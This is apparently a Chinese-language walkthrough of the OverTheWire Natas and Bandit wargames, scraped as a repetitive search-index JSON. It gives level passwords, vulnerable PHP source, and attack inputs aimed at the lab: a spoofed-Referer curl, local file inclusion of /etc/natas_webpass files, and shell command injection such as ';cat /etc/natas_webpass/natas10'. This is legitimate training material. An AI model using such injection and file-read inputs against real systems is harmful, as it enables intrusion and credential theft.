natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q eve:zo4mJWyNj2 mallory:9urtcpzBmH level3 \u6e90\u4ee3\u7801\u5565\u4e5f\u6ca1\u6709\uff0c\u5f88G <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas3\", \"pass\": \"G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q\" };</script></head> <body> <h1>natas3</h1> <div id=\"content\"> There is nothing on this page <!-- No more information leaks!! Not even Google will find it this time... --> </div> </body></html> \u8c37\u6b4c\u641c\u4e0d\u5230\uff1f\u6211\u5fc5\u5e94\u6765\u641c\uff01 \u8fdb\u53bb\u662f\u4e00\u4e2a\u548clevel2\u4e00\u6837\u7684\u754c\u9762\uff0c\u89e3\u51b3\u4e86\u3002\u3002\u3002 natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm \u8fd9\u4e2a\u9898\u9700\u8981\u77e5\u9053 site: \u8fd9\u4e2a\u9ad8\u7ea7\u641c\u7d22\u7528\u6cd5 level4 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas4\", \"pass\": \"tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm\" };</script></head> <body> <h1>natas4</h1> <div id=\"content\"> Access disallowed. You are visiting from \"\" while authorized users should come only from \"http://natas5.natas.labs.overthewire.org/\" <br/> <div id=\"viewsource\"><a href=\"index.php\">Refresh page</a></div> </div> </body> </html> \u7136\u540e\u4e00\u6761\u547d\u4ee4\u89e3\u51b3 C:\\Users\\>curl -e \"http://natas5.natas.labs.overthewire.org/\" -u natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm \"http://natas4.natas.labs.overthewire.org/\" <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas4\", \"pass\": \"tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm\" };</script></head> <body> <h1>natas4</h1> <div id=\"content\"> Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD <br/> <div id=\"viewsource\"><a href=\"index.php\">Refresh page</a></div> </div> </body> </html> C:\\Users\\> \u53e6\u4e00\u79cd\u65b9\u6cd5\u5219\u662f\u4f7f\u7528burpsuite,\u81ea\u5df1\u53d1\u5305 level5 \u53d1\u73b0\u9700\u8981cookie \u90a3\u4e48\u968f\u4fbf\u6539\u6539\u4e5f\u5c31\u89e3\u51b3\u4e86 Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR level6 \u8fdb\u6765\u53ef\u4ee5\u770b\u6e90\u4ee3\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas6\", \"pass\": \"<censored>\" };</script></head> <body> <h1>natas6</h1> <div id=\"content\"> <? include \"includes/secret.inc\"; if(array_key_exists(\"submit\", $_POST)) { if($secret == $_POST['secret']) { print \"Access granted. The password for natas7 is <censored>\"; } else { print \"Wrong secret\"; } } ?> <form method=post> Input secret: <input name=secret><br> <input type=submit name=submit> </form> <div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div> </div> </body> </html> \u8fd9\u91cc\u4e0e\u5bc6\u94a5\u6709\u4e00\u4e2a\u662f\u5426\u76f8\u540c\u7684\u5224\u65ad\uff0c\u90a3\u4e48\u76f4\u63a5\u8bbf\u95ee\u90a3\u4e2a\u7f51\u5740 includes/secret.inc \uff0c\u5f97\u5230\u5bc6\u94a5 <? $secret = \"FOEIUWGHFEEUHOFUOIU\"; ?> \u7136\u540e\u8f93\u5165\uff0c\u5f97\u5230\u5bc6\u7801 Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr level7 \u767b\u5f55\u540e\u6e90\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas7\", \"pass\": \"jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr\" };</script></head> <body> <h1>natas7</h1> <div id=\"content\"> <a href=\"index.php?page=home\">Home</a> <a href=\"index.php?page=about\">About</a> <br> <br> <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --> </div> </body> </html> \u8fd9\u4e2a\u63d0\u793a\uff0c\u5f88\u6709\u8fd9\u4e2a\u7f51\u7ad9\u7684\u98ce\u683c\u3002\u3002\u3002 # \u8bbf\u95ee\u7f51\u5740http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 # \u5bc6\u94a5 a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB level8 \u6838\u5fc3\u5728\u4e0b\u8fb9\u513f <? $encodedSecret = \"3d3d516343746d4d6d6c315669563362\"; function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); } if(array_key_exists(\"submit\", $_POST)) { if(encodeSecret($_POST['secret']) == $encodedSecret) { print \"Access granted. The password for natas9 is <censored>\"; } else { print \"Wrong secret\"; } } ?> strrev\u51fd\u6570\u7684 \u8bf4\u660e \uff0c\u5c31\u662f\u53cd\u8f6c\u5b57\u7b26\u4e32\u3002 \u56e0\u6b64\uff0c\u5efa\u8bae\u627e\u4e00\u4e9b\u5728\u7ebf\u5c0f\u5de5\u5177\u505a\u4e0b\u9762\u7684\u64cd\u4f5c <?php echo base64_decode(strrev(hex2bin(\"3d3d516343746d4d6d6c315669563362\"))); ?> \u8f93\u51fa\u7ed3\u679c\u540e\uff0c\u5f97\u5230\u5bc6\u94a5 Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd level9 <? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { passthru(\"grep -i $key dictionary.txt\"); } ?> \u76f4\u63a5\u547d\u4ee4\u6ce8\u5165 \u8f93\u5165;cat /etc/natas_webpass/natas10 \u5f97\u5230\u5bc6\u94a5 D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE level10 \u4ed6\u4eec\u5b66\u806a\u660e\u4e86 <? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { if(preg_match('/[;|&]/',$key)) { print \"Input contains an illegal character!\"; } else { passthru(\"grep -i $key dictionary.txt\"); } } ?> \u5c31\u662f\u5199\u6b63\u5219\uff0c\u6c34\u7684 [a-zA-Z] /etc/natas_webpass/natas11 # [[:alpha:]] /etc/natas_webpass/natas11 # 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg level11 \u4ee3\u7801\u5ba1\u8ba1\u5de5\u4f5c\u5982\u4e0b\uff1a <? $defaultdata = array( \"showpassword\"=>\"no\", \"bgcolor\"=>\"#ffffff\"); function xor_encrypt($in) { $key = '<censored>'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i<strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } function loadData($def) { global $_COOKIE; $mydata = $def; if(array_key_exists(\"data\", $_COOKIE)) { $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\"data\"])), true); if(is_array($tempdata) && array_key_exists(\"showpassword\", $tempdata) && array_key_exists(\"bgcolor\", $tempdata)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $tempdata['bgcolor'])) { $mydata['showpassword'] = $tempdata['showpassword']; $mydata['bgcolor'] = $tempdata['bgcolor']; } } } return $mydata; } function saveData($d) { setcookie(\"data\", base64_encode(xor_encrypt(json_encode($d)))); } $data = loadData($defaultdata); if(array_key_exists(\"bgcolor\",$_REQUEST)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $_REQUEST['bgcolor'])) { $data['bgcolor'] = $_REQUEST['bgcolor']; } } saveData($data); ?> level12 level13 level14 level15 level16 level17 level18 level19 level20 level21 level21 level23 level24 level25 level26 level27 level28 level29 level30 level31 level32 level33","title":"natas"},{"location":"en/WarGame/Natas/#level0","text":"\u76f4\u63a5\u767b\u5f55\uff0c\u7136\u540e\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas0\", \"pass\": \"natas0\" };</script></head> <body> <h1>natas0</h1> <div id=\"content\"> You can find the password for the next level on this page. <!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 --> </div> </body> </html>","title":"level0"},{"location":"en/WarGame/Natas/#level1","text":"\u4e0d\u8ba9\u53f3\u952e\u4e86 \u90a3\u5c31\u6309F12\u554a <!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->","title":"level1"},{"location":"en/WarGame/Natas/#level2","text":"\u8bf4\u5565\u4e5f\u6ca1\u6709 \u8fd8\u662f\u770b\u6e90\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas2\", \"pass\": \"h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7\" };</script></head> <body> <h1>natas2</h1> <div id=\"content\"> There is nothing on this page <img src=\"files/pixel.png\"> </div> </body></html> \u6709\u4e2a\u56fe\u7247\uff0c\u70b9\u8fdb\u53bb\u770b\uff0c\u8fdb\u7236\u76ee\u5f55 http://natas2.natas.labs.overthewire.org/files/ \u5f97\u5230\u5bc6\u7801 # username:password alice:BYNdCesZqW bob:jw2ueICLvT charlie:G5vCxkVV3m natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q eve:zo4mJWyNj2 mallory:9urtcpzBmH","title":"level2"},{"location":"en/WarGame/Natas/#level3","text":"\u6e90\u4ee3\u7801\u5565\u4e5f\u6ca1\u6709\uff0c\u5f88G <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas3\", \"pass\": \"G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q\" };</script></head> <body> <h1>natas3</h1> <div id=\"content\"> There is nothing on this page <!-- No more information leaks!! Not even Google will find it this time... --> </div> </body></html> \u8c37\u6b4c\u641c\u4e0d\u5230\uff1f\u6211\u5fc5\u5e94\u6765\u641c\uff01 \u8fdb\u53bb\u662f\u4e00\u4e2a\u548clevel2\u4e00\u6837\u7684\u754c\u9762\uff0c\u89e3\u51b3\u4e86\u3002\u3002\u3002 natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm \u8fd9\u4e2a\u9898\u9700\u8981\u77e5\u9053 site: \u8fd9\u4e2a\u9ad8\u7ea7\u641c\u7d22\u7528\u6cd5","title":"level3"},{"location":"en/WarGame/Natas/#level4","text":"<html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas4\", \"pass\": \"tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm\" };</script></head> <body> <h1>natas4</h1> <div id=\"content\"> Access disallowed. You are visiting from \"\" while authorized users should come only from \"http://natas5.natas.labs.overthewire.org/\" <br/> <div id=\"viewsource\"><a href=\"index.php\">Refresh page</a></div> </div> </body> </html> \u7136\u540e\u4e00\u6761\u547d\u4ee4\u89e3\u51b3 C:\\Users\\>curl -e \"http://natas5.natas.labs.overthewire.org/\" -u natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm \"http://natas4.natas.labs.overthewire.org/\" <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas4\", \"pass\": \"tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm\" };</script></head> <body> <h1>natas4</h1> <div id=\"content\"> Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD <br/> <div id=\"viewsource\"><a href=\"index.php\">Refresh page</a></div> </div> </body> </html> C:\\Users\\> \u53e6\u4e00\u79cd\u65b9\u6cd5\u5219\u662f\u4f7f\u7528burpsuite,\u81ea\u5df1\u53d1\u5305","title":"level4"},{"location":"en/WarGame/Natas/#level5","text":"\u53d1\u73b0\u9700\u8981cookie \u90a3\u4e48\u968f\u4fbf\u6539\u6539\u4e5f\u5c31\u89e3\u51b3\u4e86 Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR","title":"level5"},{"location":"en/WarGame/Natas/#level6","text":"\u8fdb\u6765\u53ef\u4ee5\u770b\u6e90\u4ee3\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas6\", \"pass\": \"<censored>\" };</script></head> <body> <h1>natas6</h1> <div id=\"content\"> <? include \"includes/secret.inc\"; if(array_key_exists(\"submit\", $_POST)) { if($secret == $_POST['secret']) { print \"Access granted. The password for natas7 is <censored>\"; } else { print \"Wrong secret\"; } } ?> <form method=post> Input secret: <input name=secret><br> <input type=submit name=submit> </form> <div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div> </div> </body> </html> \u8fd9\u91cc\u4e0e\u5bc6\u94a5\u6709\u4e00\u4e2a\u662f\u5426\u76f8\u540c\u7684\u5224\u65ad\uff0c\u90a3\u4e48\u76f4\u63a5\u8bbf\u95ee\u90a3\u4e2a\u7f51\u5740 includes/secret.inc \uff0c\u5f97\u5230\u5bc6\u94a5 <? $secret = \"FOEIUWGHFEEUHOFUOIU\"; ?> \u7136\u540e\u8f93\u5165\uff0c\u5f97\u5230\u5bc6\u7801 Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr","title":"level6"},{"location":"en/WarGame/Natas/#level7","text":"\u767b\u5f55\u540e\u6e90\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas7\", \"pass\": \"jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr\" };</script></head> <body> <h1>natas7</h1> <div id=\"content\"> <a href=\"index.php?page=home\">Home</a> <a href=\"index.php?page=about\">About</a> <br> <br> <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --> </div> </body> </html> \u8fd9\u4e2a\u63d0\u793a\uff0c\u5f88\u6709\u8fd9\u4e2a\u7f51\u7ad9\u7684\u98ce\u683c\u3002\u3002\u3002 # \u8bbf\u95ee\u7f51\u5740http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 # \u5bc6\u94a5 a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB","title":"level7"},{"location":"en/WarGame/Natas/#level8","text":"\u6838\u5fc3\u5728\u4e0b\u8fb9\u513f <? $encodedSecret = \"3d3d516343746d4d6d6c315669563362\"; function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); } if(array_key_exists(\"submit\", $_POST)) { if(encodeSecret($_POST['secret']) == $encodedSecret) { print \"Access granted. The password for natas9 is <censored>\"; } else { print \"Wrong secret\"; } } ?> strrev\u51fd\u6570\u7684 \u8bf4\u660e \uff0c\u5c31\u662f\u53cd\u8f6c\u5b57\u7b26\u4e32\u3002 \u56e0\u6b64\uff0c\u5efa\u8bae\u627e\u4e00\u4e9b\u5728\u7ebf\u5c0f\u5de5\u5177\u505a\u4e0b\u9762\u7684\u64cd\u4f5c <?php echo base64_decode(strrev(hex2bin(\"3d3d516343746d4d6d6c315669563362\"))); ?> \u8f93\u51fa\u7ed3\u679c\u540e\uff0c\u5f97\u5230\u5bc6\u94a5 Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd","title":"level8"},{"location":"en/WarGame/Natas/#level9","text":"<? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { passthru(\"grep -i $key dictionary.txt\"); } ?> \u76f4\u63a5\u547d\u4ee4\u6ce8\u5165 \u8f93\u5165;cat /etc/natas_webpass/natas10 \u5f97\u5230\u5bc6\u94a5 D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE","title":"level9"},{"location":"en/WarGame/Natas/#level10","text":"\u4ed6\u4eec\u5b66\u806a\u660e\u4e86 <? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { if(preg_match('/[;|&]/',$key)) { print \"Input contains an illegal character!\"; } else { passthru(\"grep -i $key dictionary.txt\"); } } ?> \u5c31\u662f\u5199\u6b63\u5219\uff0c\u6c34\u7684 [a-zA-Z] /etc/natas_webpass/natas11 # [[:alpha:]] /etc/natas_webpass/natas11 # 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg","title":"level10"},{"location":"en/WarGame/Natas/#level11","text":"\u4ee3\u7801\u5ba1\u8ba1\u5de5\u4f5c\u5982\u4e0b\uff1a <? $defaultdata = array( \"showpassword\"=>\"no\", \"bgcolor\"=>\"#ffffff\"); function xor_encrypt($in) { $key = '<censored>'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i<strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } function loadData($def) { global $_COOKIE; $mydata = $def; if(array_key_exists(\"data\", $_COOKIE)) { $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\"data\"])), true); if(is_array($tempdata) && array_key_exists(\"showpassword\", $tempdata) && array_key_exists(\"bgcolor\", $tempdata)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $tempdata['bgcolor'])) { $mydata['showpassword'] = $tempdata['showpassword']; $mydata['bgcolor'] = $tempdata['bgcolor']; } } } return $mydata; } function saveData($d) { setcookie(\"data\", base64_encode(xor_encrypt(json_encode($d)))); } $data = loadData($defaultdata); if(array_key_exists(\"bgcolor\",$_REQUEST)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $_REQUEST['bgcolor'])) { $data['bgcolor'] = $_REQUEST['bgcolor']; } } saveData($data); ?>","title":"level11"},{"location":"en/WarGame/Natas/#level12","text":"","title":"level12"},{"location":"en/WarGame/Natas/#level13","text":"","title":"level13"},{"location":"en/WarGame/Natas/#level14","text":"","title":"level14"},{"location":"en/WarGame/Natas/#level15","text":"","title":"level15"},{"location":"en/WarGame/Natas/#level16","text":"","title":"level16"},{"location":"en/WarGame/Natas/#level17","text":"","title":"level17"},{"location":"en/WarGame/Natas/#level18","text":"","title":"level18"},{"location":"en/WarGame/Natas/#level19","text":"","title":"level19"},{"location":"en/WarGame/Natas/#level20","text":"","title":"level20"},{"location":"en/WarGame/Natas/#level21","text":"","title":"level21"},{"location":"en/WarGame/Natas/#level21_1","text":"","title":"level21"},{"location":"en/WarGame/Natas/#level23","text":"","title":"level23"},{"location":"en/WarGame/Natas/#level24","text":"","title":"level24"},{"location":"en/WarGame/Natas/#level25","text":"","title":"level25"},{"location":"en/WarGame/Natas/#level26","text":"","title":"level26"},{"location":"en/WarGame/Natas/#level27","text":"","title":"level27"},{"location":"en/WarGame/Natas/#level28","text":"","title":"level28"},{"location":"en/WarGame/Natas/#level29","text":"","title":"level29"},{"location":"en/WarGame/Natas/#level30","text":"","title":"level30"},{"location":"en/WarGame/Natas/#level31","text":"","title":"level31"},{"location":"en/WarGame/Natas/#level32","text":"","title":"level32"},{"location":"en/WarGame/Natas/#level33","text":"","title":"level33"},{"location":"en/WarGame/bandit/","text":"OverTheWire\u793e\u533a\u662f\u4e00\u4e2a\u63d0\u4f9bwargame\u7684\u7f51\u7ad9\uff0c\u53ef\u4ee5\u5e2e\u52a9\u5b89\u5168\u7231\u597d\u8005\u4ee5\u8da3\u5473\u7684\u65b9\u5f0f\u8fdb\u884c\u5b66\u4e60\u3001\u7ec3\u4e60\u5b89\u5168\u77e5\u8bc6\u3002 bandit\uff0c\u719f\u6089linux\u548cbash\u7684\u6709\u8da3\u7684\u7f51\u7ad9 level0 ssh\u8fdc\u7a0b\u767b\u5f55 ssh bandit0@bandit.labs.overthewire.org -p 2220 # \u7136\u540e\u8f93\u5165\u5bc6\u7801\u5373\u53ef \u987a\u5229\u62ff\u5230\u63d0\u793a\u7b26 level1 \u8981\u6c42\u4f7f\u7528cat\u547d\u4ee4\uff0c\u6c34 bandit0@bandit:~$ ll total 24 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile -rw-r----- 1 bandit1 bandit0 33 Apr 23 18:04 readme bandit0@bandit:~$ cat readme NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL bandit0@bandit:~$ level2 \u5904\u7406\u540d\u5b57\u53eb\u201c-\u201d\u7684\u6587\u4ef6\uff0c\u8fd9\u4e2a\u7531\u4e8e\u4f1a\u548c\u53c2\u6570\u89e3\u6790\u6df7\u4e86\uff0c\u6211\u7684\u5904\u7406\u529e\u6cd5\u662f\u52a0\u4e0a\u201c./\u201d bandit1@bandit:~$ ll total 24 -rw-r----- 1 bandit2 bandit1 33 Apr 23 18:04 - drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit1@bandit:~$ cat ./- rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi bandit1@bandit:~$ level3 \u5904\u7406\u540d\u5b57\u91cc\u6709\u7a7a\u683c\u7684\u6587\u4ef6\uff0c\u76f4\u63a5\u62ff\u53cc\u5f15\u53f7\u5305\u8d77\u6765\u5373\u53ef bandit2@bandit:~$ ll total 24 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile -rw-r----- 1 bandit3 bandit2 33 Apr 23 18:04 spaces in this filename bandit2@bandit:~$ cat \"spaces in this filename\" aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG bandit2@bandit:~$ level4 \u5904\u7406\u6587\u4ef6\u5939\uff0c\u6b63\u786e\u7684\u65b9\u5f0f\u5e94\u8be5\u662fcd\u8fdb\u53bb\u518d\u5904\u7406\uff0c\u56e0\u4e3a\u5728\u8fd9\u4e2a\u9636\u6bb5\u8fd8\u4e0d\u6d89\u53ca\u7edd\u5bf9\u8def\u5f84\u3001\u76f8\u5bf9\u8def\u5f84\u4e4b\u7c7b\u7684\u6982\u5ff5\uff0c\u4f46\u662f\u6211\u61d2\u4e86 \u53e6\u5916\uff0c\u8fd8\u6709\u4e2a\u5904\u7406\u9690\u85cf\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528ls -l\u547d\u4ee4\uff0c\u5728\u5927\u591a\u6570bash\u4e2d\u4f1a\u628als -al\u5199\u6210\u522b\u540dll \u4e5f\u53ef\u4ee5\u4f7f\u7528ls -a bandit3@bandit:~$ ll total 24 